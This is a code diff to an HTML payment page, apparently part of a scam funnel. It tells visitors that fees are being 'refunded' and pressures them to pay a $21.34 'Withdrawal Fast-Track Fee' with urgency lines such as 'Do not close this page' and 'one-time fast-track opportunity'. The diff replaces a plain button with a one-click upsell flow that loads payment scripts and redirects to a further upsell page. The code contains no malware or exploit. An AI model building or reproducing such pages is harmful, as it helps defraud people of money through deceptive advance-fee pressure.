@@ -235,7 +235,28 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
 			The amounts of <b>$19.90</b> are currently being processed as a <b>REFUND</b> and will be sent together with your total withdrawal.<br><br>If you would like to <strong>expedite</strong> your withdrawal and receive the fee amounts <b>immediately</b>, pay the <b>Withdrawal Fast-Track Fee</b> and receive your withdrawal in as little as 2 minutes.<br><b>(Do not close this page. This is a one-time fast-track opportunity.)</b>
 		</p><p></p>
 
-		<button style="background-color:#fe2b5e;" id="paymentButton">PAY WITHDRAWAL FAST-TRACK FEE</button>
+		<div style="display:flex;flex-direction:column;gap:12px;width:fit-content;font-family:inherit;" data-cooud-flow-root>
+  <script type="application/json">{"steps":[{"title":"Withdrawal Fast-Track Fee","priceText":"$21.34","primary":{"id":"01KMTBYB6TEZMJQVRD7YXZB30F","redirect":"https://questionsplayertttq.vercel.app/up1","label":"PAY WITHDRAWAL FAST-TRACK FEE","style":"display: flex; align-items: center; justify-content: center; text-decoration: none; font-family: inherit; font-weight: 600; padding: 16px 24px; font-size: 17px; border-radius: 8px; background-color: #fe2b5e; color: #ffffff; border: none; width: 100%; cursor: pointer;"},"fallback":null,"dismiss":{"primary":{"label":"Não, obrigado","style":"display: inline-flex; align-items: center; justify-content: center; text-decoration: none; font-family: inherit; font-weight: 400; padding: 12px 20px; font-size: 15px; border-radius: 8px; background-color: transparent; color: #6b7280; border: none;  cursor: pointer;"},"fallback":{"label":"Não, obrigado","style":"display: inline-flex; align-items: center; justify-content: center; text-decoration: none; font-family: inherit; font-weight: 400; padding: 12px 20px; font-size: 15px; border-radius: 8px; background-color: transparent; color: #6b7280; border: none;  cursor: pointer;"}}}],"initialStep":0,"startInFallback":false,"processingText":"Processando...","noMoreOffersText":"Obrigado! Sem mais ofertas.","connectScriptUrl":"https://orbit.cooud.com/scripts/connect"}</script>
+  <button
+    type="button"
+    data-cooud-flow-primary
+    data-connect-action="take"
+    data-connect-id="01KMTBYB6TEZMJQVRD7YXZB30F"
+    data-connect-redirect="https://questionsplayertttq.vercel.app/up1"
+    style="display: flex; align-items: center; justify-content: center; text-decoration: none; font-family: inherit; font-weight: 600; padding: 16px 24px; font-size: 17px; border-radius: 8px; background-color: #fe2b5e; color: #ffffff; border: none; width: 100%; cursor: pointer;"
+  >
+    PAY WITHDRAWAL FAST-TRACK FEE
+  </button>
+  <button
+    type="button"
+    data-cooud-flow-dismiss
+    data-connect-action="dismiss"
+    style="display: inline-flex; align-items: center; justify-content: center; text-decoration: none; font-family: inherit; font-weight: 400; padding: 12px 20px; font-size: 15px; border-radius: 8px; background-color: transparent; color: #6b7280; border: none;  cursor: pointer;"
+  >
+    Não, obrigado
+  </button>
+<script src="https://js.stripe.com/v3/" async defer></script>
+<script src="https://orbit.cooud.com/scripts/flow" async defer></script>
 
 	</div>
 </div>
